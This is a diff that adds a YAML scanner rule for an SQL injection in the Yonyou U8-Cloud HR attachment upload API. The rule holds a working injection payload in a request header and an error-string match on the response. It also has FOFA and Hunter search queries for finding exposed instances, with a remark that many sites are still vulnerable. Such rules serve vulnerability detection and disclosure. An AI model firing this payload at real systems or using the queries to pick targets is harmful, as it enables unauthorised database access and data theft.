@@ -1,0 +1,16 @@
+name: yonyouNC-U8C-sqlserver-sqli2        
+rules: 
+  - method: GET    
+    path: /u8cloud/api/hr/attachment/upload?mssql_error
+    headers:
+      system: -1' or 1=@@version--+
+    body:                 
+    expression:                        
+      status_code: 200                 
+      response_header:              
+      response_body: 在将 nvarchar 值                       
+detail:                          
+  description: "用友NC Cloud，大型企业数字化平台，聚焦数字化管理、数字化经营、数字化商业，帮助大型企业实现人、财、物、客的全面数字化。用友U8-Cloud api/hr接口存在SQL注入漏洞,截止到2024.5.29仍存在很多该漏洞网站"
+  search:             
+    fofa: app="用友-U8-Cloud"
+    鹰图: web.body="http://uclient.yonyou.com/api/uclient/public/download/windows" or web.body="请下载新版UClient"
